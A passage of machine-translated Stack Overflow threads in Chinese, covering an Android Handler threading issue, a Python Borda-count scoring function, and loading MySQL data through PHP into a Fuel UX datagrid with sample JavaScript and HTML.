这就是我之前使用的要点，效果很好。但是，我真的不喜欢设置类变量然后让 Handler 稍后抓取它的做法。我对其进行了修改以传递一个将 .obj 字段设置为字符串的消息，然后将其剥离并附加到 TextView。这会因上述异常而崩溃。我尝试将 Handler 声明留在原处，但将其中的逻辑移动到 Handler 将 .post(Runnable(){}); 具有相同的胆量，但这只会在长时间等待后停止并附加它。我对 Java/Android 中处理程序和线程的内部工作原理不是很了解，所以任何指针都会非常受欢迎。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:07:09.083

您正在静态创建处理程序，它在加载程序线程中创建它。在 onCreate() 中创建处理程序，它将绑定到 UI 线程，并解决您的问题。此外，您可以在收到消息时执行[handler.sendEmptyMessageDelayed](http://developer.android.com/reference/android/os/Handler.html#sendEmptyMessageDelayed%28int,%20long%29)而不是 Thread.sleep，并且只需发送初始消息即可开始。我认为处理程序中的 Thread.sleep 会阻塞线程。

# python - 重复列表和字典

> ID：13548996
> 
> 赞同：1
> 
> 时间：2012-11-25T06:59:34.270
> 
> 标签：python, dictionary, python-3.x

在下面的代码中，为什么我的代码不能正确迭代？我可能错过了一行，但我不知道为什么它不起作用。

我有以下测试用例的功能：

```
>>> borda([['A', 'B', 'C', 'D'], ['B', 'A', 'C', 'D'], ['B', 'C', 'D', 'A']])
('B', [5, 8, 4, 1]) 
```

其中参数中的列表是排名，每个排名#1 得 3 分，#2 得 2 分，#3 得 1 分，其他排名都没有。不一定有四个选择。元组中的第一个元素应该是得分最高的选项，第二个元素是每个选项得到的点数，按字母顺序排列。

我还没有完成该功能，但我正在尝试获取选择字典作为按字母顺序排列的键和排名计数作为值，但输出是只有最后一个元素的字典参数中的最后一个列表。

```
L = ['A', 'B', 'C', 'D'] #This is referenced outside the function since it might change
D = {}
i = 0
num = 0
while num < len(L):
    num += 1
    for choice in L:
        while i < len(parameter):
            for item in parameter:
                if item[0] == choice:
                    D[choice] = D.get(choice, 0) + 3
                if item[1] == choice:
                    D[choice] = D.get(choice, 0) + 2
                if item[2] == choice:
                    D[choice] = D.get(choice, 0) + 1
                i += 1
return D 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:18:07.633

我这样做的方式是这样的：

```
import operator
from collections import defaultdict
listoflists = [['A', 'B', 'C', 'D'], ['B', 'A', 'C', 'D'], ['B', 'C', 'D', 'A']]

def borda(listoflists):
   outdict = defaultdict(int)
   for item in listoflists:
      outdict[item[0]] += 3
      outdict[item[1]] += 2
      outdict[item[2]] += 1

   highestitem = max(outdict.iteritems(), key=operator.itemgetter(1))[0]
   outlist = [outdict[item[0]] for item in sorted(outdict.keys())]

   return (highestitem, outlist) 
```

**更新：**
我不确定你为什么不能使用`import`标准模块，但如果出于某种原因你被禁止使用该`import`语句，这里有一个只有内置函数的版本：

```
listoflists = [['A', 'B', 'C', 'D'], ['B', 'A', 'C', 'D'], ['B', 'C', 'D', 'A']]

def borda(listoflists):
    outdict = {}
    for singlelist in listoflists:
        # Below, we're just turning singlelist around in order to
        # make use of index numbers from enumerate to add to the scores
        for index, item in enumerate(singlelist[2::-1]):
            if item not in outdict:
                outdict[item] = index + 1
            else:
                outdict[item] += index + 1

    highestitem = max(outdict.iteritems(), key=lambda i: i[1])[0]
    outlist = [outdict[item[0]] for item in sorted(outdict.keys())]

    return (highestitem, outlist) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T09:33:34.467

如果你有 2.7：

```
import operator
from collections import Counter
listoflists = [['A', 'B', 'C', 'D'], ['B', 'A', 'C', 'D'], ['B', 'C', 'D', 'A']]

def borda(listoflists):
    outdict = sum([Counter({item[x]:3-x}) for item in listoflists for x in range(3]],
                  Counter())
    highestitem = max(outdict.iteritems(), key=operator.itemgetter(1))[0]
    outlist = [outdict[item[0]] for item in sorted(outdict.iteritems(),
                                                   key=operator.itemgetter(0))]
return (highestitem, outlist) 
```

看马..没有循环:-)

查看[http://ua.pycon.org/static/talks/kachayev/index.html](http://ua.pycon.org/static/talks/kachayev/index.html)了解为什么这样更好。

# php - 如何使用 javascript 和 PHP 导入数据 Fuel UX datagrid

> ID：13548998
> 
> 赞同：4
> 
> 时间：2012-11-25T07:00:05.380
> 
> 标签：php, javascript, jquery, twitter-bootstrap, fuelux

Fuel UX 在这里： [http ://exacttarget.github.com/fuelux/](http://exacttarget.github.com/fuelux/)

具体来说，我正在尝试使用 Datagrid。

这是一个例子： [http ://code.exacttarget.com/code-examples/datagrid.html](http://code.exacttarget.com/code-examples/datagrid.html)

我试图重新创建这个： [https ://raw.github.com/ExactTarget/fuelux/master/sample/data.js](https://raw.github.com/ExactTarget/fuelux/master/sample/data.js)

只需通过 PHP 文件输出即可。我能够让 PHP 正确输出正确的数据并将其转储到主文件中，因此 data.js 文件现在使用这些标签在主 PHP/HTML 文件中输出，我的所有信息都在标题中：

```
<script></script> 
```

并使用了 GitHub 网站上的示例标记。

我似乎无法让它正常工作，是否有另一种方法可以将数据从 PHP 导入数据网格？是否应该更改 data.js 的某些代码，因为它现在正在主 php/html 文件中输出？

基本上是尝试使用 PHP 从 MySQL 中提取数据，然后将其转储到数据网格中。我似乎找不到太多文档，我想我真正的问题是将数据从我的 php 应用程序导入 Fuel UX Datagrid 的最佳方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-05T12:37:27.070

~~用php/mysql写入data.js，以sample/data.js为例。（或将您的 .php 重命名为 data.js 并解析为 php（[使用 htaccess 将 js/css 解析为 PHP 文件](https://stackoverflow.com/questions/10722375/parse-js-css-as-a-php-file-using-htaccess)））。~~

[从骨干集合中设置fuelux datagrid 源](https://stackoverflow.com/questions/15744861/setting-fuelux-datagrid-source-from-backbone-collection)给出了正确的方向。

假设您有一个包含以下字段的数据数据库表：id、title 和 city，并且您希望在数据网格中显示它。

创建从你的mysql返回json格式的php文件（示例）：

**数据.php：**

```
<?
error_reporting(E_ALL);
ini_set('report_errors','on');
$mysqli = new mysqli('localhost', 'root', '*******', 'cities');
if ($mysqli->connect_error) {
    die('Connect Error (' . $mysqli->connect_errno . ') '
            . $mysqli->connect_error);
}

$data = array();
if ($result = $mysqli->query('SELECT `id`,`title`,`city` FROM `poi`')) 
{

        //$data['testdata'] = mysqli_fetch_all($result,MYSQLI_ASSOC);
        while(($row=$result->fetch_assoc())){$data[]=$row;}
        $result->close();
}

header('Cache-Control: no-cache, must-revalidate');
header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
header('Content-type: application/json');
echo json_encode($data);
exit; 
```

创建一个静态数据源**testdatasource.js**：

```
/*
 * Fuel UX Data components - static data source
 * https://github.com/ExactTarget/fuelux-data
 *
 * Copyright (c) 2012 ExactTarget
 * Licensed under the MIT license.
 */

(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        define(['underscore'], factory);
    } else {
        root.TestDataSource = factory();
    }
}(this, function () {

    var TestDataSource = function (options) {
        this._formatter = options.formatter;
        this._columns = options.columns;
        this._delay = options.delay || 0;
    };

    TestDataSource.prototype = {

        columns: function () {
            return this._columns;
        },

        data: function (options, callback) {
            var self = this;

            setTimeout(function () {
                var data;
                $.ajax({
                    url: '/data.php',
                    dataType: 'json',
                    async: false,
                    success: function(result) {
                        data = result;
                    }
                });

                                    // SEARCHING
                if (options.search) {
                    data = _.filter(data, function (item) {
                        var match = false;

                        _.each(item, function (prop) {
                            if (_.isString(prop) || _.isFinite(prop)) {
                                if (prop.toString().toLowerCase().indexOf(options.search.toLowerCase()) !== -1) match = true;
                            }
                        });

                        return match;
                    });
                }

                var count = data.length;

                // SORTING
                if (options.sortProperty) {
                    data = _.sortBy(data, options.sortProperty);
                    if (options.sortDirection === 'desc') data.reverse();
                }

                // PAGING
                var startIndex = options.pageIndex * options.pageSize;
                var endIndex = startIndex + options.pageSize;
                var end = (endIndex > count) ? count : endIndex;
                var pages = Math.ceil(count / options.pageSize);
                var page = options.pageIndex + 1;
                var start = startIndex + 1;

                data = data.slice(startIndex, endIndex);

                if (self._formatter) self._formatter(data);

                callback({ data: data, start: start, end: end, count: count, pages: pages, page: page });

            }, this._delay)
        }
    };

    return TestDataSource;
})); 
```

这会从 data.php 构建一个数据集`$.ajax({ url: '/data.php', dataType: 'json', async: false, success: function(result) { data = result; } });`

在您的 html 中调用您的数据集并创建列：

```
var dataSource = new TestDataSource({
columns: [
{
property: 'id',
label: 'ID',
sortable: true
},
{
property: 'title',
label: 'Title',
sortable: true
},
{
property: 'city',
label: 'City',
sortable: true
}
],
delay: 250
}); 
```

使用此数据源初始化网格网格：

```
$('#MyGrid').datagrid({
dataSource: dataSource
}); 
```

# 让数据网格工作：

1.  从 /fuelux-master/ 下载源代码 (zip) 并解压到 /fuelux-master/
2.  创建 /index.html

**索引.html**：

```
<!DOCTYPE html>
<html lang="en" class="fuelux">
<head>
<meta charset="utf-8">
<title>Fuel UX 2</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="./fuelux-master/dist/css/fuelux.css" rel="stylesheet">

<script src="./fuelux-master/lib/require.js"></script>

<style type="text/css">
body {
padding-bottom: 200px;
}
</style>

<script>
requirejs.config({
paths: {
'jquery': './fuelux-master/lib/jquery',
'underscore': 'http://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.3.3/underscore-min',
'bootstrap': './fuelux-master/lib/bootstrap/js',
'fuelux': './fuelux-master/src',
'sample': './fuelux-master/sample'
}
});

require(['jquery', 'sample/data', 'sample/datasource', 'sample/datasourceTree', 'fuelux/all'], 

function ($, sampleData, StaticDataSource,datasourceTree) {

// DATAGRID
var dataSource = new StaticDataSource({
columns: [
{
property: 'toponymName',
label: 'Name',
sortable: true
},
{
property: 'countrycode',
label: 'Country',
sortable: true
},
{
property: 'population',
label: 'Population',
sortable: true
},
{
property: 'fcodeName',
label: 'Type',
sortable: true
}
],
data: sampleData.geonames,
delay: 250
});

$('#MyGrid').datagrid({
dataSource: dataSource
});

});
</script>

</head>

<body>

<div class="container">

<!-- DATAGRID -->
<table id="MyGrid" class="table table-bordered datagrid">

<thead>
<tr>
<th>
<span class="datagrid-header-title">Geographic Data Sample</span>

<div class="datagrid-header-left">
<div class="input-append search datagrid-search">
<input type="text" class="input-medium" placeholder="Search">
<button class="btn"><i class="icon-search"></i></button>
</div>
</div>
<div class="datagrid-header-right">
<div class="select filter" data-resize="auto">
<button data-toggle="dropdown" class="btn dropdown-toggle">
<span class="dropdown-label"></span>
<span class="caret"></span>
</button>
<ul class="dropdown-menu">
<li data-value="all" data-selected="true"><a href="#">All</a></li>
<li data-value="lt5m"><a href="#">Population &lt; 5M</a></li>
<li data-value="gte5m"><a href="#">Population &gt;= 5M</a></li>
</ul>
</div>
</div>
</th>
</tr>
</thead>

<tfoot>
<tr>
<th>
<div class="datagrid-footer-left" style="display:none;">
<div class="grid-controls">
<span>
<span class="grid-start"></span> -
<span class="grid-end"></span> of
<span class="grid-count"></span>
</span>
<div class="select grid-pagesize" data-resize="auto">
<button data-toggle="dropdown" class="btn dropdown-toggle">
<span class="dropdown-label"></span>
<span class="caret"></span>
</button>
<ul class="dropdown-menu">
<li data-value="5" data-selected="true"><a href="#">5</a></li>
<li data-value="10"><a href="#">10</a></li>
<li data-value="20"><a href="#">20</a></li>
<li data-value="50"><a href="#">50</a></li>
<li data-value="100"><a href="#">100</a></li>
</ul>
</div>
<span>Per Page</span>
</div>
</div>
<div class="datagrid-footer-right" style="display:none;">
<div class="grid-pager">
<button type="button" class="btn grid-prevpage"><i class="icon-chevron-left"></i></button>
<span>Page</span>

<div class="input-append dropdown combobox">
<input class="span1" type="text">
<button class="btn" data-toggle="dropdown"><i class="caret"></i></button>
<ul class="dropdown-menu"></ul>
</div>
<span>of <span class="grid-pages"></span></span>
<button type="button" class="btn grid-nextpage"><i class="icon-chevron-right"></i></button>
</div>
</div>
</th>
</tr>
</tfoot>
</table>

</div>
</body>
</html> 
```

请参阅requirejs 配置路径中的**./fuelux-master/**。`var dataSource`另请参阅定义列的初始化。至少您需要用 id="MyGrid" 编写表格的完整 html。

CDN 的一些重构和使用示例： http: [//plnkr.co/hZRjry5vG8ZcOG4VbjNq](http://plnkr.co/hZRjry5vG8ZcOG4VbjNq)

*   通过 CDN 和 requirejs 使用 bootstrap 和 jQuery，请参阅[Loading Bootstrap from CDN with Require.js](https://stackoverflow.com/questions/13464846/loading-bootstrap-from-cdn-with-require-js)
*   用 datagrid.js 替换 all.js 的包含（**请注意**，如果没有 select.js，datagrid 将无法工作，并且 select.js 需要 util.js）
*   删除 sample/datasourceTree 因为我们不需要它